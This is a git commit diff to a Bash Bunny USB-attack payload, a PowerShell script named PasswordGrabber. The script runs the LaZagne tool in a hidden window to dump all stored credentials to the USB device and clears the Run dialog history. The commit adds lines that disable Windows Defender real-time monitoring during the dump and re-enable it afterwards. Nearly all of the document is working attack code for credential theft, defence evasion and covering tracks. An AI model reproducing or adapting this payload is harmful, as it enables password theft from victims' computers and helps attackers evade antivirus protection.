244c402b23df215e130c3be6b16211c7fd4441c8
Dennis Veninga <dennis.veninga@gmail.com>
2018-05-11 15:58:01 +0200

    Update payload.ps1
    Disables Windows Defender and activates again after finishing.

--- payloads/library/credentials/PasswordGrabber/payload.ps1
+++ payloads/library/credentials/PasswordGrabber/payload.ps1
@@ -1,5 +1,9 @@
-$dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\PasswordGrabber')
+$dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\PassGrabv2')
 $filter = 'password_'+ $env:COMPUTERNAME
+Set-MpPreference -DisableRealtimeMonitoring $true
+sleep 3
 $filecount = ((Get-ChildItem -filter ($filter + "*") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)
 Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tools\laZagne.exe') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt')
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+sleep 3
+Set-MpPreference -DisableRealtimeMonitoring $false
